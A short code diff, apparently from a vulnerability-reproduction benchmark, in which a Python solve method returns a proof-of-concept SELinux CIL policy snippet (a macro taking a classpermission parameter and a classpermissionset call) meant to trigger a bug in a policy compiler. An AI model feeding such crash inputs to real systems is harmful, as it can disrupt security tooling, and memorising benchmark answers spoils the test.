@@ -2,11 +2,10 @@ import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b"""
-(class mycls (read write))
-(macro m ((cp classpermission))
-    (classpermissionset cs1 (cp))
+        poc = """
+(macro m ((CP classpermission))
+  (classpermissionset cps CP)
 )
-(call m ((mycls (read))))
+(call m ((CP (file (getattr)))))
 """
-        return poc
+        return poc.encode()
